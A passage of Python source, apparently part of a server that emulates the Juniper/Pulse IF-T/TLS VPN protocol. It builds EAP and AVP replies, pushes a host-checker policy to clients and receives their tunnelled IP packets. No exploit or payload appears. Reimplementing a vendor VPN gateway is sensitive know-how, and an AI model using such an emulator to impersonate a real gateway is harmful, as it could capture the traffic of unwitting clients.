                self.logger.info(f'Generated host checker policy: {policy.hex()}')

                # Wrap it in an EAP request
                inner_eap_data += policy
                inner_eap = EAPPacket(vendor=JUNIPER_1, code=EAP_REQUEST, identifier=0x02, eap_data=inner_eap_data)

                # Build the AVP data from inner EAP data (without vendor)
                avp = AVP(code=0x4f, flags=0x40, value=inner_eap.to_bytes()[4:])

                # Add AVP data to outer EAP data
                outer_eap_data += avp.to_bytes(include_padding=True)

                # Construct outer EAP packet
                outer_eap = EAPPacket(vendor=JUNIPER_1, code=EAP_REQUEST, identifier=0x04, eap_data=outer_eap_data)

                # Build IFT packet
                reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=0x05, message_identifier=0x01F9, message_value=outer_eap.to_bytes())

                # Append to output buffer
                outbuf += reply.to_bytes()

            # Prompt for host-checker policy
            elif self.is_client_info(eap_in.eap_data):
                self.logger.info('Received AVP structures with OS data. Prompting for host checker..')

                # The client indicated that the policy was not OK, so we need to send a remediation packet
                # EAP within AVP within EAP within IF-T/TLS
                outer_eap_data = bytearray()
                outer_eap_data += EXPANDED_JUNIPER.to_bytes(4, 'big')
                outer_eap_data += (1).to_bytes(4, 'big')

                # This is the EAP data encapsulated in AVP (which is itself encapsulated in EAP/IF-T/TLS)
                inner_eap_data = bytearray()
                inner_eap_data += EXPANDED_JUNIPER.to_bytes(4, 'big')
                inner_eap_data += (3).to_bytes(4, 'big')
                inner_eap_data += b'\x21' # unknown: prompt for host-checker policy request

                inner_eap = EAPPacket(vendor=JUNIPER_1, code=EAP_REQUEST, identifier=0x01, eap_data=inner_eap_data)

                # Build the AVP data from inner EAP data (without vendor)
                avp = AVP(code=0x4f, flags=0x40, value=inner_eap.to_bytes()[4:])

                # Add AVP data to outer EAP data
                outer_eap_data += avp.to_bytes(include_padding=True)

                # Construct outer EAP packet
                outer_eap = EAPPacket(vendor=JUNIPER_1, code=EAP_REQUEST, identifier=0x03, eap_data=outer_eap_data)

                # Build IFT packet
                reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=0x05, message_identifier=0x01F8, message_value=outer_eap.to_bytes())

                # Append to output buffer
                outbuf += reply.to_bytes()

        return outbuf

    def _wrap_packet(self, packet_data, client):
        """Wrap an IP packet in IF-T/TLS format."""
        # Create IF-T packet with the IP packet as the message value
        packet = IFTPacket(
            vendor_id=VENDOR_JUNIPER,
            message_type=0x4,
            message_identifier=0,
            message_value=packet_data
        )
        return packet.to_bytes()

    def handle_data(self, data, client_socket, client_ip):
        try:
            client_socket.setblocking(True)
            client_socket.settimeout(10)
            connection_id, _ = self.packet_handler.create_session(client_socket, self._wrap_packet)
            buf = bytearray()
            if data:
                buf.extend(data)

            while True:
                # Read more data if we don't have a full header
                while len(buf) < 16:
                    try:
                        chunk = client_socket.recv(self.buffer_size)
                        if not chunk:
                            return True
                        buf.extend(chunk)
                    except (socket.timeout, ssl.SSLWantReadError, BlockingIOError):
                        continue

                # Parse the message length from the header
                msg_len = int.from_bytes(buf[8:12], 'big')
                if msg_len < 16 or msg_len > self.max_packet_size:
                    self.logger.error(f"Invalid IF-T/TLS length {msg_len}; dropping connection")
                    return False

                # If we don't have the full message yet, read more
                if len(buf) < msg_len:
                    try:
                        chunk = client_socket.recv(self.buffer_size)
                        if not chunk:
                            return True
                        buf.extend(chunk)
                        continue
                    except (socket.timeout, ssl.SSLWantReadError, BlockingIOError):
                        continue

                # We have a full message
                packet = bytes(buf[:msg_len])
                del buf[:msg_len]

                try:
                    # Pass connection_id to process
                    resp = self.process(packet, client_socket, connection_id)
                    if resp:
                        client_socket.sendall(resp)
                except Exception as e:
                    self.logger.error(f"Error processing packet: {e}")

        except Exception as e:
            self.logger.error(f"Error in handle_data: {e}")
        finally:
            try:
                self.packet_handler.destroy_session(connection_id)
                client_socket.close()
            except Exception:
                pass
        return True

    def process(self, data, client_socket, connection_id):
        """Parse a complete IF-T/TLS frame and build any response frames"""
        outbuf = bytearray()

        while data:
            # Parse a single IF-T/TLS packet
            self.logger.debug(f'inbuf: {data.hex()}')

            try:
                reader = io.BytesIO(data)
                packet = IFTPacket.from_io(reader)
                data = reader.read()
            except Exception as e:
                self.logger.error(f'Failed to parse IF-T/TLS packet: {e}')
                break

            # Handle packet types
            if packet.message_type == IFT_VERSION_REQUEST:
                self.logger.info('Got IFT_VERSION_REQUEST')
                reply = IFTPacket(
                    vendor_id=VENDOR_TCG,
                    message_type=IFT_VERSION_RESPONSE,
                    message_identifier=0x01F5,
                    message_value=(2).to_bytes(4, 'big')  # version 2
                )
                outbuf += reply.to_bytes()

            elif packet.message_type == IFT_TLS_CLIENT_INFO:
                self.logger.info('Got IFT_TLS_CLIENT_INFO')
                auth_data = packet.message_value.decode(errors='ignore').strip('\x00\n')
                self.logger.info(f'Client info: {auth_data}')
                reply = IFTPacket(
                    vendor_id=VENDOR_TCG,
                    message_type=IFT_CLIENT_AUTH_CHALLENGE,
                    message_identifier=0x01F6,
                    message_value=JUNIPER_1.to_bytes(4, 'big')
                )
                outbuf += reply.to_bytes()

            elif packet.message_type == IFT_CLIENT_AUTH_RESPONSE:
                self.logger.info('Got IFT_CLIENT_AUTH_RESPONSE')
                outbuf += self.parse_eap_packet(packet.message_value, client_socket, connection_id)

            elif packet.message_type == 0x89:  # Logout request
                self.logger.info('Got logout request')
                return bytearray()

            elif packet.message_type == 0x4:  # Tunnelled IP packet
                if packet.message_value and packet.message_value[0] == 0x45:  # IPv4
                    self.logger.debug('Got IP packet')
                    self.packet_handler.handle_client_packet(
                        packet.message_value,
                        connection_id
                    )

        self.logger.debug(f'outbuf: {outbuf.hex()}')
        return outbuf
